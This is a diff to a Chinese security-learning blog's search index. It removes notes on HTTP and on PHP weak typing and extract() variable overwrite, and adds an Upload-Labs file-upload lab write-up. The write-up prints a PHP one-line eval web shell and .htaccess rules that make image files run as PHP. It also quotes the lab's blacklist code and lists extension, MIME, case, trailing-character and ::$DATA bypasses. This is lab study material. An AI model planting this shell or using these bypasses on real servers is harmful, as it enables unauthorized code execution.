@@ -1,275 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HTTP协议学习：从请求头到响应头</title>
-    <url>/2026/10/28/http-protocol-learning/</url>
-    <content><![CDATA[本文结合 moectf 2024 的 ezhttp 题目，整理 HTTP 请求行、常见请求头、请求体，以及响应状态码和响应头。
-
-
-HTTP 请求
-HTTP 请求的第一行叫请求行，包含请求方法、请求目标和 HTTP 版本。常见方法有：
-
-GET：获取指定资源。
-POST：向服务器提交数据，常用于创建或处理资源。
-HEAD：请求与 GET 类似，但只返回响应头，不返回响应体。
-
-请求行下面是请求头，常见字段包括：
-
-Host：请求访问的主机名。
-X-Forwarded-For：代理服务器常用来传递客户端 IP。只有来自可信代理的值才应作为真实来源，因为客户端可能自行伪造它。
-Referer：表示请求从哪个页面发起。
-User-Agent：描述客户端使用的设备、操作系统和浏览器等信息。
-Content-Type：描述请求体的数据格式，例如表单或 JSON。
-
-请求头之后是请求体。题目中的请求体示例为 imoau=sb。如果提交 JSON，请求头中的 Content-Type 通常应设为 application/json；表单数据则使用对应的表单媒体类型。
-HTTP 响应
-服务器响应的第一行包含 HTTP 版本、状态码和状态描述。状态码按范围表示处理结果：
-
-1xx：信息响应，请求仍在处理中。
-2xx：请求已成功处理。
-3xx：需要重定向或进一步操作。
-4xx：请求存在问题，或服务器无法按请求提供资源。
-5xx：服务器处理请求时发生错误。
-
-常见状态码：
-
-200 OK：请求成功。
-301 Moved Permanently：资源已永久迁移，响应会提供新的地址。
-404 Not Found：服务器找不到请求的资源。
-418 I’m a teapot：一个真实定义过的状态码，源自愚人节 RFC，常作为趣味状态码出现。
-500 Internal Server Error：服务器遇到未预期的错误。
-
-响应状态行下面是响应头，常见字段包括：
-
-Server：服务器软件信息；出于安全考虑，服务器可能会隐藏或简化此字段。
-Content-Type：响应体的媒体类型，例如 text/html 或 application/json。
-Set-Cookie：让浏览器保存或更新 Cookie。
-Content-Length：响应体的长度（以字节计，具体行为也受传输方式影响）。
-
-响应头之后是响应体，通常包含浏览器最终显示的页面内容或接口返回的数据。
-]]></content>
-      <categories>
-        <category>web安全学习</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-        <tag>Web安全</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP学习笔记：类型比较、超全局变量与面向对象</title>
-    <url>/2026/10/28/php-learning/</url>
-    <content><![CDATA[本文记录 PHP 基础语法、弱类型比较、超全局变量与常见函数，并通过类、对象、构造方法和继承入门面向对象。
-
-
-学习地址
-基础语法PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器
-PHP代码的基本格式
-&lt;?php//PHP代码?&gt;
-
-PHP变量
-变量以 $ 符号开始，后面跟着变量的名称
-
-变量名必须以字母或者下划线字符开始
-
-变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
-
-变量名不能包含空格
-
-变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
-这些和其他语言的差别不大
-
-
-&lt;?php$x=5;  //给x赋值$y=6;  // $给变量赋值 $z=$x+$y;echo $z;?&gt;
-
-PHP 是一门弱类型语言
-这是什么意思那，就是不必向 PHP 声明该变量的数据类型，和C语言对比，比如c语言定义一个整型变量需要int a; 但是在PHP中就不需要，PHP 会根据变量的值，自动把变量转换为正确的数据类型。
-PHP数据类型和比较
-String（字符串）
-
-Integer（整型）
-
-Float（浮点型）
-
-Boolean（布尔型）
-
-Array（数组）
-
-Object（对象）
-
-NULL（空值）
-
-Resource（资源类型）
-数组这里array() 和其他语言不太一样，重点学习一下
-
-
-&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;
-
-
-面向对象的部分放在后面写
-类型比较
-注意事项说在前面
-这里我踩了一些坑，刚一开始我用的系统安装的php来跑，发现怎么都得不到想要的flag，后来查询资料得到了原来是因为我安装的php8，版本比较高了，这些都不存在了
-这段代码的关键区别在 $num == 1：PHP 7 会把 &quot;1abc&quot; 转成数字 1；PHP 8 不再这样处理，所以同样的输入在 PHP 7 能得到 flag，在 PHP 8 不能
-所以环境一定要选择对，可以用phpstudy的环境来跑
-
-松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型
-
-严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型
-&lt;?phpif(42 == &quot;42&quot;) &#123;    echo &#x27;1、值相等&#x27;;&#125; echo PHP_EOL; // 换行符 if(42 === &quot;42&quot;) &#123;    echo &#x27;2、类型相等&#x27;;&#125; else &#123;    echo &#x27;3、类型不相等&#x27;;&#125;?&gt;
-
-
-这里让gpt写了一段php代码来学习一下弱类型比较
-&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;PHP 条件判断练习&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;get&quot;&gt;        &lt;label&gt;            输入 num：            &lt;input type=&quot;text&quot; name=&quot;num&quot;&gt;        &lt;/label&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;    &lt;/form&gt;    &lt;pre&gt;&lt;?php    if (isset($_GET[&#x27;num&#x27;]) &amp;&amp; is_string($_GET[&#x27;num&#x27;])) &#123;        $num = $_GET[&#x27;num&#x27;];        if (!is_numeric($num)) &#123;            // 将输入作为普通文字显示            echo htmlspecialchars($num, ENT_QUOTES, &#x27;UTF-8&#x27;);            if ($num == 1) &#123;                echo &quot;\nflag&#123;**********&#125;&quot;;            &#125;        &#125;    &#125;    ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
-
-如果输入的是单纯一个数字，什么都不会显示
-
-但是如果输入1abc的话，就会直接出flag
-
-这里的原理就是源代码中
-if ($num == 1) &#123;               echo &quot;\nflag&#123;**********&#125;&quot;;           &#125;
-
-判断一下输入的数字是否和1相等，如果我理解没错的话，要比较的1是一位数组，然后我们输入的是1abc 自动的也就是和第一位的1比较了，然后因为弱类型比较，得到的是true，所以就输出了flag
-超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。
-PHP 超级全局变量列表:
-
-$GLOBALS
-
-$_SERVER
-
-$_REQUEST
-
-$_POST
-
-$_GET
-
-$_FILES
-
-$_ENV
-
-$_COOKIE
-
-$_SESSION
-也就是在这些输入点，可能会导致很多的漏洞点，这里借用一下学长总结的表格
-
-
-
-变量
-用途
-渗透关注点
-
-
-
-$_GET
-URL 参数
-最常见注入入口
-
-
-$_POST
-POST Body
-表单注入入口
-
-
-$_REQUEST
-GET+POST+Cookie
-参数来源混乱，易绕过
-
-
-$_COOKIE
-Cookie
-认证伪造、反序列化
-
-
-$_SESSION
-会话
-会话固定、会话劫持
-
-
-$_SERVER
-服务器信息
-信息泄露、HTTP_* 头伪造
-
-
-$_FILES
-上传文件
-文件上传漏洞
-
-
-$GLOBALS
-全局变量
-变量覆盖
-
-
-
-
-函数PHP中的一些危险函数
-上文中是一些在CTF中出现的一些可能会导致漏洞危险函数
-这里便不再赘述了，因为只学原理不实践的话也没什么意义，所以我选择边实践边学习，遇到了再学
-这里先把extract()学习一下
-extract($_GET)作用是 将GET请求的参数直接解析为变量并覆盖原有变量；
-&lt;?php$flag = &quot;xxxxxxxxxxxx&quot;;extract($_GET);if($secret == &quot;admin&quot;)&#123;echo $flag;&#125;else&#123;echo &quot;Access Denied&quot;;&#125;?&gt;
-
-正常代码无法直接控制 $secret，但是 extract() 会自动创建&#x2F;覆盖任意变量。也就是说：我们在URL传什么参数，服务器就会生成什么变量。
-这里extract接收GET的参数，由于这个函数可以直接覆盖GET到的参数，所以就直接可以在url中加上?secret=admin可以直接覆盖掉原本的参数，直接就可以输出flag
-面向对象可以把它们串成一条线来理解：类定义对象有哪些数据和行为；序列化保存对象的数据；反序列化恢复对象。如果恢复的数据由外部控制，而对象又会自动执行某些操作，就可能产生漏洞。
-这里来学习面向对象,用一下菜鸟教程中的一个汽车的例子
-&lt;?phpclass Car &#123;    public $color;    public function __construct($color = &quot;green&quot;)    &#123;        $this-&gt;color = $color;    &#125;    public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;);echo $car-&gt;describe();?&gt;
-
-这是程序执行之后的结果
-
-这里开始一段一段的分析代码
-class car  定义一个类car，也就相当于car的设计图
-public $color 在类中声明一个名为 color 的公开属性，用于保存每个对象的颜色,也就相当于规定了在Car中都需要有color（颜色）这个属性，意思就是汽车的设计图中得设计一下颜色
-function describe() 在类中定义的一个方法，这个方法的作用就是描述一下这个车的颜色是什么
-$this 表示目前操作的对象，可能也能想象成英语中的代词哈哈
-$car = new Car(&quot;white&quot;)这个代码很关键，这里原本的含义是new一个新对象,用通俗的话来讲就是让工厂按照 Car 这份设计图，生产一辆新车，并在生产时指定颜色为白色，再用 $car 指代这辆车。
-学习反序列化之前，先学习一下__construct()
-__construct() 魔术方法-构造方法 使用 new 创建对象时，PHP 会自动调用它，用来设置对象的初始状态
-这个可以这样理解
-new Car(&quot;white&quot;)       ↓创建一个 Car 对象       ↓自动调用 __construct(&quot;white&quot;)       ↓参数 $color 得到 &quot;white&quot;       ↓$this-&gt;color = $color       ↓新对象的颜色被设置为 &quot;white&quot;
-
-当然，在类和对象中，这个方法也不是必须有的，下面再看一个例子
-class Car&#123;    public $color;&#125;// 没有构造方法，照样可以创建对象$car = new Car();// 创建后，再设置颜色$car-&gt;color = &quot;white&quot;;echo $car-&gt;color; // 输出 white
-
-如果没有构造方法，只能先创建对象，然后给对象设置颜色，当然这里肯定就不能像有构造方法时候直接在new对象时候传递参数，也就是不能这样$car = new Car(&quot;white&quot;);
-当然，有了构造方法，也可以写多个参数，在这里多设置一个价格，也是可以的
-class Car&#123;    public $color;    public $price;    public function __construct($color,$price)    &#123;        $this-&gt;color = $color;        $this-&gt;price = $price;    &#125;  public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;,1000);echo $car-&gt;color; // whiteecho $car-&gt;price; // 1000
-
-在这里简单的学完构造方法之后，还有一个自定义的方法function describe()&#96;
-在类和对象中，也可以自定义方法，在这个例子中，describe()就是我们自定义的方法，-&gt; 不仅可以用来引用类中的属性，也可以用来引用方法
-我们自定义的这个方法的含义，在这个car的例子来讲的话，可以通俗的理解为用来描述这个车的颜色
-至此为止，我们用通俗易懂的例子学习了面向对象中的类、对象、属性、方法
-再学一个新概念，继承
-例如，“电动车”也是一种“车”，可以继承 Car
-我们已经有一份汽车设计图 Car，现在想设计电动车，可以在汽车设计图的基础上增加电池等功能，不必从头设计。 这就是继承。
-class ElectricCar extends Car&#123;    public $battery;    public function __construct($color, $price, $battery)    &#123;        parent::__construct($color, $price);        $this-&gt;battery = $battery;    &#125;&#125;
-
-这里：
-
-Car 是父类。
-
-ElectricCar 是子类。
-
-extends 表示继承。
-parent::__construct($color, $price);表示：调用父类的构造方法，让它负责设置颜色和价格。
-
-
-现在电动车不仅有自己的 $battery，还可以使用继承来的公开属性和方法
-$car = new ElectricCar(&quot;white&quot;, 1000, 80);
-
-总结目前php的学习就先到这里，在函数的那个部分，等到在ctf的过程中遇到什么就学什么，然后再来补充
-]]></content>
-      <categories>
-        <category>web安全学习</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基础逆向分析学习</title>
     <url>/2026/10/16/reverse-engineering-basics/</url>
     <content><![CDATA[本文整理 Android 注册逻辑、Java 解密、ELF 与 Windows 程序等基础逆向分析题目的思路和脚本。
@@ -365,6 +96,202 @@ code = [&#x27;\x1f&#x27;,&#x27;\x12&#x27;,&#x27;\x1d&#x27;,&#x27;(&#x27;,&#x27;0
       <categories>
         <category>逆向学习</category>
       </categories>
+  </entry>
+  <entry>
+    <title>文件上传安全：Upload-Labs 绕过思路与防御</title>
+    <url>/2026/11/02/file-upload-security/</url>
+    <content><![CDATA[本文为 Upload-Labs 本地靶场学习记录，示例仅用于自建或明确授权的测试环境。生产系统应采用严格白名单、服务端内容校验，并将上传文件存放在不可执行目录。
+
+
+1.一句话木马&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;
+
+通过upload-labs学习文件上传绕过手法
+upload-labsPass - 01（前端校验绕过）方法一：禁用js上传a.php 发现了弹窗，可以想到禁用js代码，禁用js之后上传成功
+
+方法二：删除前端校验函数
+Pass - 02（MIME类型验证绕过）这里发现删除前端校验的函数发现没用了，那肯定是服务端校验了
+这里还是直接上传a.php 提示上传的文件类型不正确
+
+查看源码分析一下
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+上传文件的type必须为image/jepg image/png image/gif
+用bp抓一下包，把content-type改为需要的类型
+
+
+放包之后得到了一个图片，上传成功
+
+Pass - 03（特殊后缀黑名单绕过）
+这里看到是限制了这类的后缀文件，尝试使用其他可被解析的后缀名
+
+双重后缀：shell.php.jpg、shell.jpg.php（取决于解析规则）
+
+PHP 其他后缀： .php3, .php4, .php5, .phtml,.phar等（需要服务器配置支持）。
+
+大小写混淆： .Php, .pHp（适用于黑名单校验为小写，但系统本身不区分大小写的Windows服务器）
+
+URL 编码：shell%2ephp、双重编码（取决于解码顺序）
+
+
+这里尝试了.php3, .php4, .php5, .phtml,.phar全部都可以绕过
+查看一下源码是什么样子的
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+可以看到大小写是绕不过去的,末尾点、空格、::$DATA 不可行
+Pass - 04（.htaccess 文件攻击）查看源代码，基本什么都被显示了
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+.htaccess 是 Apache Web 服务器的目录级配置文件。
+它可以影响当前目录及子目录的行为，例如：
+
+重写 URL
+设置访问权限
+配置默认首页
+设置错误页面
+控制缓存
+指定某些文件的处理方式
+
+AddHandler php5-script .jpg AddType application/x-httpd-php .jpg Sethandler application/x-httpd-php
+
+Sethandler 将该目录及子目录的所有文件均映射为php文件类型。Addhandler 使用 php5-script 处理器来解析所匹配到的文件。AddType 将特定扩展名文件映射为php文件类型。
+简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php
+&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
+
+然后上传shell.jpg,访问上传的图片
+
+Pass - 05（大小写转换绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有大小写验证，直接上传shell.PHP
+Pass - 06（黑名单验证空格绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;
+
+没有末尾去除空格的函数，抓包改一下名字，就能绕过
+
+Pass - 07（黑名单末尾点绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有去除末尾.的函数，直接绕过
+抓包修改包名，和上一题一样，空格换成.就行
+
+Pass - 08（黑名单验证，特殊字符::$DATA绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉
+
